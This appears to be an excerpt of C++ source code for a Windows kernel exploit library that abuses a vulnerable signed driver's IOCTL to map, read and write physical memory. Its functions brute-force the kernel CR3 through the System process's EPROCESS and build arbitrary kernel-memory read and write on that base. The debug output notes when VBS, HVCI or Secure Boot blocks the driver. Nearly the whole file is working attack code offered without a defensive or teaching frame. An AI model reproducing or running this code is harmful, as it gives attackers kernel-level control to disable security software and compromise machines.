...
namespace VulnDriver {
    ...
    NTSTATUS MapPhysicalMemory(HANDLE device, ULONGLONG physAddr, ULONG size, PVOID* mappedAddr) {
        ...
        if (device == nullptr || device == INVALID_HANDLE_VALUE) {
            printf("[DBG] MapPhysicalMemory: invalid device handle\n");
            return STATUS_INVALID_HANDLE;
        }
        if (!mappedAddr || size == 0) {
            printf("[DBG] MapPhysicalMemory: invalid params (mappedAddr=%p, size=%lu)\n", mappedAddr, size);
            return STATUS_INVALID_PARAMETER;
        }
        ...
        if (NT_SUCCESS(status) && ioData.MappedAddress != nullptr) {
            *mappedAddr = ioData.MappedAddress;
            ...
            printf("[DBG] MapPhysicalMemory FAILED: physAddr=0x%llX, size=0x%lX, IOCTL status=0x%08X, MappedAddress=%p, ioStatus=0x%08X\n",
                   (unsigned long long)physAddr, size, status, ioData.MappedAddress, (DWORD)ioStatus.Status);
            if (NT_SUCCESS(status)) {
    ...
    NTSTATUS ReadPhysicalMemory(HANDLE device, ULONGLONG physAddr, PVOID buffer, SIZE_T size) {
        ...
        if (!NT_SUCCESS(status)) {
            printf("[DBG] ReadPhysicalMemory: MapPhysicalMemory failed for physAddr=0x%llX, mapSize=0x%lX, status=0x%08X\n",
                   (unsigned long long)physAddr, mapSize, status);
            return status;
        }
        ...
        __except (EXCEPTION_EXECUTE_HANDLER) {
            printf("[DBG] ReadPhysicalMemory: ACCESS_VIOLATION reading physAddr=0x%llX\n", (unsigned long long)physAddr);
    ...
    NTSTATUS WritePhysicalMemory(HANDLE device, ULONGLONG physAddr, PVOID data, SIZE_T size) {
        ...
        NTSTATUS status = MapPhysicalMemory(device, physAddr & ~0xFFFULL, mapSize, &mapped);
        if (!NT_SUCCESS(status)) {
            printf("[DBG] WritePhysicalMemory: MapPhysicalMemory failed for physAddr=0x%llX, mapSize=0x%lX, status=0x%08X\n",
                   (unsigned long long)physAddr, mapSize, status);
            return status;
        }
        ...
        __except (EXCEPTION_EXECUTE_HANDLER) {
            printf("[DBG] WritePhysicalMemory: ACCESS_VIOLATION writing physAddr=0x%llX\n", (unsigned long long)physAddr);
            UnmapPhysicalMemory(device, mapped);
            return STATUS_ACCESS_VIOLATION;
        }
    ...
    static bool g_PhysMemIoctlTested = false;
    ...
    static BOOL VerifyCR3Candidate(HANDLE device, ULONGLONG cr3Candidate, ULONGLONG ntoskrnlVA) {
        ...
        UCHAR mzHeader[2] = { 0 };
        NTSTATUS readSt = ReadPhysicalMemory(device, physAddr, mzHeader, 2);
        if (!NT_SUCCESS(readSt)) {
            printf("[DBG] VerifyCR3: ReadPhysicalMemory failed at phys=0x%llX, status=0x%08X\n",
                   (unsigned long long)physAddr, readSt);
            return FALSE;
        }
    ...
    static ULONGLONG GetKernelCR3FromEPROCESS(HANDLE device, ULONGLONG ntoskrnlBase) {
        printf("[DBG] GetKernelCR3FromEPROCESS: ntoskrnlBase=0x%llX\n", (unsigned long long)ntoskrnlBase);
        ...
        if (!pPsInitialSystemProcess) {
            printf("[DBG] GetKernelCR3FromEPROCESS: PsInitialSystemProcess export not found!\n");
            return 0;
        }
        printf("[DBG] GetKernelCR3FromEPROCESS: PsInitialSystemProcess kernel addr=%p\n", pPsInitialSystemProcess);

        if (!g_PhysMemIoctlTested) {
            g_PhysMemIoctlTested = true;
            printf("[DBG] Testing physical memory IOCTL at low address 0x1000...\n");
            PVOID testMapped = nullptr;
            NTSTATUS testSt = MapPhysicalMemory(device, 0x1000, 0x1000, &testMapped);
            if (NT_SUCCESS(testSt) && testMapped) {
                printf("[DBG] Physical memory IOCTL works: mapped 0x1000 -> %p\n", testMapped);
                UnmapPhysicalMemory(device, testMapped);
            } else {
                printf("[DBG] Physical memory IOCTL FAILED: status=0x%08X, mapped=%p\n", testSt, testMapped);
                printf("[DBG] This means the vuln driver cannot map physical memory on this system!\n");
                printf("[DBG] Possible causes: VBS/HVCI enabled, Secure Boot, driver blocked, IOCTL mismatch\n");
            }
        }
        ...
        int candidateCount = sizeof(lowCR3Candidates) / sizeof(lowCR3Candidates[0]);
        printf("[DBG] CR3 brute-force phase 1: testing %d known candidates...\n", candidateCount);
        int phase1Attempts = 0;
        for (int i = 0; i < candidateCount; i++) {
            ...
            if (!NT_SUCCESS(ReadPhysicalMemory(device, physPsInit, &systemEprocess, sizeof(systemEprocess)))) {
                printf("[DBG] CR3 candidate 0x%llX: translated PsInitialSystemProcess but ReadPhysicalMemory failed at phys=0x%llX\n",
                       (unsigned long long)testCR3, (unsigned long long)physPsInit);
                continue;
            }
            
            if (systemEprocess == 0 || (systemEprocess & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL) {
                printf("[DBG] CR3 candidate 0x%llX: EPROCESS ptr invalid (0x%llX)\n",
                       (unsigned long long)testCR3, (unsigned long long)systemEprocess);
                continue;
            }
            
            ULONGLONG physEprocess = VirtualToPhysicalWithCR3(device, testCR3, systemEprocess);
            if (physEprocess == 0) {
                printf("[DBG] CR3 candidate 0x%llX: EPROCESS VA 0x%llX -> phys translation failed\n",
                       (unsigned long long)testCR3, (unsigned long long)systemEprocess);
                continue;
            }
            ...
            if (!NT_SUCCESS(ReadPhysicalMemory(device, physEprocess + 0x28, &dtb, sizeof(dtb)))) {
                printf("[DBG] CR3 candidate 0x%llX: failed to read DTB at physEprocess+0x28 (0x%llX)\n",
                       (unsigned long long)testCR3, (unsigned long long)(physEprocess + 0x28));
                continue;
            }
            ...
            if (dtb == 0 || dtb > 0x800000000ULL) {
                printf("[DBG] CR3 candidate 0x%llX: DTB out of range (0x%llX)\n",
                       (unsigned long long)testCR3, (unsigned long long)dtb);
                continue;
            }
            
            if (VerifyCR3Candidate(device, dtb, ntoskrnlBase)) {
                printf("[DBG] CR3 phase 1 SUCCESS: candidate 0x%llX -> DTB=0x%llX (attempt %d/%d)\n",
                       (unsigned long long)testCR3, (unsigned long long)dtb, phase1Attempts, candidateCount);
                return dtb;
            } else {
                printf("[DBG] CR3 candidate 0x%llX: DTB=0x%llX failed MZ verification\n",
                       (unsigned long long)testCR3, (unsigned long long)dtb);
            }
        }
        printf("[DBG] CR3 phase 1 exhausted: all %d known candidates failed\n", candidateCount);
        
        printf("[DBG] CR3 brute-force phase 2: scanning 0x100000-0x10000000 (65280 pages)...\n");
        int phase2Attempts = 0;
        int phase2TranslateHits = 0;
        int phase2EprocessReads = 0;
        int phase2DtbReads = 0;
        for (ULONGLONG testCR3 = 0x100000; testCR3 < 0x10000000; testCR3 += 0x1000) {
            ...
            if (VerifyCR3Candidate(device, dtb, ntoskrnlBase)) {
                printf("[DBG] CR3 phase 2 SUCCESS: testCR3=0x%llX -> DTB=0x%llX (attempt %d, hits=%d, eproc=%d, dtb=%d)\n",
                       (unsigned long long)testCR3, (unsigned long long)dtb,
                       phase2Attempts, phase2TranslateHits, phase2EprocessReads, phase2DtbReads);
                return dtb;
            }
        }
        
        printf("[DBG] CR3 phase 2 FAILED: scanned %d pages, translateHits=%d, eprocReads=%d, dtbReads=%d\n",
               phase2Attempts, phase2TranslateHits, phase2EprocessReads, phase2DtbReads);
        return 0;
    }

    static ULONGLONG FindKernelCR3(HANDLE device, ULONGLONG ntoskrnlBase) {
        printf("[DBG] FindKernelCR3: starting CR3 discovery for ntoskrnl=0x%llX\n", (unsigned long long)ntoskrnlBase);
        ULONGLONG cr3 = GetKernelCR3FromEPROCESS(device, ntoskrnlBase);
        if (cr3 != 0) {
            printf("[DBG] FindKernelCR3: SUCCESS CR3=0x%llX\n", (unsigned long long)cr3);
            return cr3;
        }
        
        printf("[DBG] FindKernelCR3: FAILED - no valid CR3 found\n");
        return 0;
    }
    ...
    ULONGLONG VirtualToPhysical(HANDLE device, PVOID virtualAddress) {
        ...
        if (g_KernelCR3 == 0) {
            printf("[DBG] VirtualToPhysical: CR3 not cached, initiating discovery...\n");
            if (g_NtoskrnlBase == 0) {
                g_NtoskrnlBase = (ULONGLONG)KernelUtils::GetKernelModuleBase("ntoskrnl.exe");
                printf("[DBG] VirtualToPhysical: g_NtoskrnlBase=0x%llX\n", (unsigned long long)g_NtoskrnlBase);
            }
            if (g_NtoskrnlBase == 0) {
                printf("[DBG] VirtualToPhysical: ntoskrnl base is NULL, cannot proceed\n");
                return 0;
            }
            g_KernelCR3 = FindKernelCR3(device, g_NtoskrnlBase);
            if (g_KernelCR3 == 0) {
                printf("[DBG] VirtualToPhysical: CR3 discovery FAILED for VA=0x%llX\n", (unsigned long long)va);
                return 0;
            }
            printf("[DBG] VirtualToPhysical: CR3 cached=0x%llX\n", (unsigned long long)g_KernelCR3);
        }
    ...
    NTSTATUS ReadKernelMemory(HANDLE device, PVOID address, PVOID buffer, SIZE_T size) {
        if (device == nullptr || device == INVALID_HANDLE_VALUE) {
            printf("[DBG] ReadKernelMemory: invalid device handle\n");
            return STATUS_INVALID_HANDLE;
        }
        if (!buffer || size == 0) {
            return STATUS_INVALID_PARAMETER;
        ...
        while (remaining > 0) {
            ...
            if (physAddr == 0) {
                printf("[DBG] ReadKernelMemory: VirtualToPhysical FAILED for VA=0x%llX (remaining=%zu of %zu)\n",
                       (unsigned long long)va, remaining, size);
                return STATUS_UNSUCCESSFUL;
            }

            NTSTATUS status = ReadPhysicalMemory(device, physAddr, outBuf, chunkSize);
            if (!NT_SUCCESS(status)) {
                printf("[DBG] ReadKernelMemory: ReadPhysicalMemory FAILED VA=0x%llX -> phys=0x%llX, status=0x%08X\n",
                       (unsigned long long)va, (unsigned long long)physAddr, status);
                return status;
            }
    ...
    NTSTATUS WriteKernelMemory(HANDLE device, PVOID address, PVOID data, SIZE_T size) {
        if (device == nullptr || device == INVALID_HANDLE_VALUE) {
            printf("[DBG] WriteKernelMemory: invalid device handle\n");
            return STATUS_INVALID_HANDLE;
        }
        if (!data || size == 0) {
            return STATUS_INVALID_PARAMETER;
        ...
        while (remaining > 0) {
            ...
            ULONGLONG physAddr = VirtualToPhysical(device, reinterpret_cast<PVOID>(va));
            if (physAddr == 0) {
                printf("[DBG] WriteKernelMemory: VirtualToPhysical FAILED for VA=0x%llX (remaining=%zu of %zu)\n",
                       (unsigned long long)va, remaining, size);
                return STATUS_UNSUCCESSFUL;
            }
            ...
            if (!NT_SUCCESS(status)) {
                printf("[DBG] WriteKernelMemory: WritePhysicalMemory FAILED VA=0x%llX -> phys=0x%llX, status=0x%08X\n",
                       (unsigned long long)va, (unsigned long long)physAddr, status);
                return status;
            }
